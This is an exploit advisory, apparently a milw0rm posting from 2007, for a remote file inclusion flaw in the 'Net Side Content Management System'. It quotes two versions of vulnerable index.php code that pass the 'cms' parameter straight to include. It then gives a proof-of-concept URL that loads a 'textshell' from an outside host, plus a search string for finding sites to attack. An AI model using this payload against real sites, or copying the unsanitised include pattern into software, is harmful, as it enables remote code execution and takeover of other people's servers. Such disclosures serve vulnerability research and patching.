@@ -1,0 +1,40 @@
+I see your future and your future is death. Sharingan !
+--------------------------------------------------------------------------------------------------------------
+Hi I'm sharingan and this is my vuln :
+script name :
+Net Side Content Management System
+(2 versions found both vulnerable | Version names not available since the script isn't downloadable)
+
+vuln file :
+index.php |and maybe others ... haven't checked|
+vuln code version 1:
+[...]
+    if ($_GET["cms"] == "" or $_GET["cms"] == "titel")
+   {
+    include "titel.inc.php";
+   }
+   else
+   {
+    include $_GET["cms"].".inc.php";
+[...]
+vuln code version 2:
+[...]
+$includepath = "";
+[...]
+if ($_GET["cms"] == "")
+   {
+     include $includepath."titel.inc.php";
+   }
+   else
+   {
+    include $includepath.$_GET["cms"].".inc.php";
+[...]
+
+proof of concept :
+http://site.com/index.php?cms=http://whatever.com/textshell.txt?
+"powered by Net-Side.net"
+--------------------------------------------------------------------------------------------------------------
+greetz mozi and all php freaks.
+oh yeah and a friendly Hi! to RST.
+
+# milw0rm.com [2007-03-24]
